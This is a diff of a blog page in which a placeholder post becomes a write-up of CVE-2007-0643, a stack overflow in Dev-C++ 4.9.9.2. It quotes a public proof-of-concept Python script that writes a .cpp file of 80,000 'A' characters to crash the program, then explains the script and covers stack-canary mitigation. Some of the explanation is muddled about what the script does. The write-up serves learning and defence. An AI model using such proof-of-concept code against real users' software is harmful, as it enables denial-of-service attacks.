@@ -7,11 +7,13 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Live-Boot Kali | CJ&#39;s tech-blogs.</title>
+    <title>Dev-C++ Error | CJ&#39;s tech-blogs.</title>
     <meta name="description" content="CJ&#39;s notes.">
     <meta name="keywords" content="">
     <meta name="HandheldFriendly" content="True">
     <meta name="MobileOptimized" content="320">
+    <link rel="icon" type="image/x-icon" href="/images/cjlogo.png">
+
     
     <link rel="stylesheet" href="/notes/notehome.css"> </head>
 
@@ -31,20 +33,80 @@
         <article class="post container" itemscope itemtype="http://schema.org/BlogPosting">
             <header class="post-header">
                 <p class="post-meta">
-                    <time datetime="2024-09-13T00:00:00+00:00" itemprop="datePublished">September 13, 2024</time>
+                    <time datetime="2024-09-13T00:00:00+00:00" itemprop="datePublished">September 14, 2024</time>
                 </p>
-                <h1 class="post-title" itemprop="name headline">Creating a "Live Boot" Kali-Linux Drive</h1> </header>
+                <h1 class="post-title" itemprop="name headline">Dev-C++ File Parsing Local Stack Overflow</h1> </header>
 
             <div class="post-content" itemprop="articleBody">
-                <p>Lorem ipsum odor amet, consectetuer adipiscing elit. Eu elit dignissim, dictum eleifend ipsum facilisi. Suscipit lacinia semper fusce elit amet potenti venenatis laoreet. Dolor luctus ultrices luctus vehicula blandit platea suscipit. Ultrices lacinia eu magnis himenaeos ipsum elit. Etiam habitasse massa tincidunt malesuada nascetur rhoncus bibendum tempor? Euismod eleifend feugiat suscipit aenean bibendum iaculis. Nulla maximus euismod mollis hac taciti metus luctus volutpat. Magna proin consequat platea quis ultrices mollis conubia ad.
+                <p><strong>CVE ID:</strong>&nbsp;2007-0643</p>
+<p><strong>Vulnerability Description:</strong>&nbsp;"Stack-based buffer overflow in Bloodshed Dev-C++ 4.9.9.2 allows user-assisted remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code via a long line in a .cpp file." [<a href="https://nvd.nist.gov/vuln/detail/CVE-2007-0643" target="_blank" rel="noopener noreferrer">nvd.nist.gov</a>].</p>
+<p><strong>CVSS Score:&nbsp;</strong>4.3 MEDIUM</p>
+<p><strong>Potential Impact:&nbsp;</strong>There is one known affected software configurations: 'cpe:2.3:a:bloodshed_software:dev-c\+\+:4.9.9.2:*:*:*:*:*:*:*'</p>
+<p><strong>Exploit ID:&nbsp;</strong>CVE-2007-0643</p>
+<p><strong>Conditions:&nbsp;</strong>This script in the vulnerability demonstrates a technique for causing a simple stack overflow in a program if the user has Bloodshed Dev-C++ 4.9.9.2</p>
+<p><strong>Language:&nbsp;</strong>Python -&gt; C++</p>
+<p><strong>Type:&nbsp;</strong>DOS</p>
+<p>&nbsp;</p>
+<p><span class="breakall">----------------------------------------------------------------------------------------------------------------------</span></p>
+<p>&nbsp;</p>
+<p>In the Bloodshed Dev-C++ vulnerability, the script that is parsed allows user-assisted remote attackers to possibly execute arbitrary code in a .cpp file as well as forcing a stack-based buffer overflow. The way that this works is quite simple.</p>
+<p><strong>See below:</strong></p>
+<p>```</p>
+<pre style="font-size: 12px;"><code>#!/usr/bin/env python
+print "--------------------------------------------------------------"
+print "Dev-C++ 4.9.9.2 Stack Overflow"
+print "url: http://www.bloodshed.net/"
+print "author: shinnai"
+print "mail: shinnai[at]autistici[dot]org"
+print "site: http://shinnai.altervista.org"
+print "--------------------------------------------------------------"
 
-                    Nostra finibus rutrum pulvinar nec tempor congue viverra dignissim! Imperdiet nisl lacinia eu nibh laoreet mus ultrices. Facilisis faucibus felis sociosqu himenaeos nam condimentum interdum. Eget pellentesque fames tellus tortor dui sem praesent. Rutrum natoque suspendisse duis ex cubilia posuere orci. Ullamcorper tellus montes eu pellentesque luctus himenaeos! Fames suspendisse mollis tempor; pellentesque aptent donec.
-                    
-                    Faucibus ligula non leo scelerisque gravida nunc. Gravida vivamus donec est ridiculus suscipit. Leo dictum auctor nullam; dis rutrum tristique. Luctus semper maecenas imperdiet metus facilisis habitasse, massa habitant integer. Purus feugiat dictum commodo auctor eros eleifend porttitor! Convallis suspendisse eget penatibus torquent tristique interdum ornare. Viverra mus condimentum vulputate velit blandit sollicitudin eros.
-                    
-                    Hendrerit himenaeos lacus porta venenatis, lorem rhoncus gravida. Accumsan nam volutpat metus; ultrices odio magnis magnis massa. Bibendum ornare sit ultrices tempor semper pulvinar eleifend etiam. Congue ullamcorper enim tortor felis et. Placerat viverra euismod elit interdum fames et. Libero luctus egestas malesuada ullamcorper molestie pulvinar duis per nulla. Congue netus ad id penatibus quis. Litora sociosqu platea cubilia lacinia nullam.
-                    
-                    Montes platea et erat habitasse inceptos; augue hendrerit malesuada libero. Nec convallis turpis donec aliquam hac odio tortor. Est netus semper tristique aliquam diam; volutpat at. Dis vestibulum cursus aliquet dui; elementum vestibulum lacinia. Duis blandit est porttitor fermentum congue vitae. Libero felis varius laoreet amet mauris pretium. Malesuada elementum venenatis porta turpis natoque.</p>
+try:
+   char = "\x41" * 80000
+
+   out_file = open('DevCpp.cpp','wb')
+   out_file.write(char)
+   out_file.close()
+
+   print "File succesfully created!\n\n"
+   print "Here is a dump:"
+   print "----------------------------------------------------------------"
+   print "pid=0A58 tid=04C4  EXCEPTION (first-chance)"
+   print "----------------------------------------------------------------"
+   print "Exception C00000FD (STACK_OVERFLOW)"
+   print "----------------------------------------------------------------"
+   print "EAX=00000674: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
+   print "EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
+   print "ECX=00404358: 8B 44 24 04 F7 40 04 06-00 00 00 0F 85 89 00 00"
+   print "EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00"
+   print "ESP=00032E1C: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00"
+   print "EBP=000334A0: CC 34 03 00 7C 43 40 00-B0 34 03 00 BF 37 91 7C"
+   print "ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
+   print "EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
+   print "EIP=7C8024E0: 53 56 57 8B 45 F8 89 65-E8 50 8B 45 FC C7 45 FC"
+   print "              --&gt; PUSH EBX"
+   print
+"----------------------------------------------------------------\n"
+   print "Encreasing the number of characters will change the results of"
+   print "this exploit. For example try with 1000000 of characters and see"
+   print "what happen."
+   print "I was unable to execute arbitrary code but I think someone
+better"
+   print "than me can successfully exploit it :P\n"
+except:
+   print "Unable to create file!"
+
+# milw0rm.com [2007-01-30]<br /></code></pre>
+<p>```</p>
+<p>What this code is basically doing is targeting the ASCII code '\x41', or the 'A' char, and overloading that with a string consisting of 80,000 A characters. This overflows that stack. It then opens a file named 'DevCpp.cpp' in 'wb' mode, or binary write mode - and then writes a large string to the file. This is a simple iteration of this technique, and this vulnerability is prone to cause a lot more harm than just this. In the file, the author writes, "I was unable to execute arbitrary code but I think someone better than me can successfully exploit it." This just means that it is definitely possible, the author simply couldn't figure it out.</p>
+<p>&nbsp;</p>
+<p>According to&nbsp;[<a href="https://nvd.nist.gov/vuln/detail/CVE-2007-0643" target="_blank" rel="noopener noreferrer">nvd.nist.gov</a>], the vulnerability has been since modified, and is waiting reanalysis. This may change some information regarding this exploit. It is possible they figured out how to make it even more harmful. Though this exploit was for a now outdated program that had many issues, exploits like this still exist in many of our modern programs today. There are several ways that this has been mitigated on modern machines with current programs, but some of the logic still exists in a harmful way. For example, there are still programs that overflow memory stacks to crash the application. It might be in a different way that the way this script targeted - but it is still a common technique.</p>
+<p>&nbsp;</p>
+<p>Something I have found that is a common fix to attacks like this are something called "Stack Canaries." Basically, you make a known value between the local variable and the return address on the stack. This way, the program can determine if the value has been altered so we can see if there is a buffer overflow attack in place. In GCC, this is a built in function. You can use the '-fstack-protector' or '-fstack-protector-strong' to enable stack canaries.</p>
+<p>&nbsp;</p>
+<p>A great resource on this I have found is a post from [<a href="https://stackoverflow.com/questions/63024660/stack-corruption-detection-using-canary-value" target="_blank" rel="noopener noreferrer">Stack Overflow]</a>&nbsp;that illustrates the usage of Stack Canaries and the logic behind how it works.</p>
+<p>&nbsp;</p>
+<p>This research can be applied due to the new understanding of how buffer overflows work on a lower level, and how easy it can be to take advantage of the stacks without proper mitigation strategies. If possible, developers should try to add stack canaries to mitigate this, and can also use other forms of data validation before allowing alteration of important memory data, ensuring that we have done something to prevent DOS attacks for our users.</p>
             </div>
         </article>
         
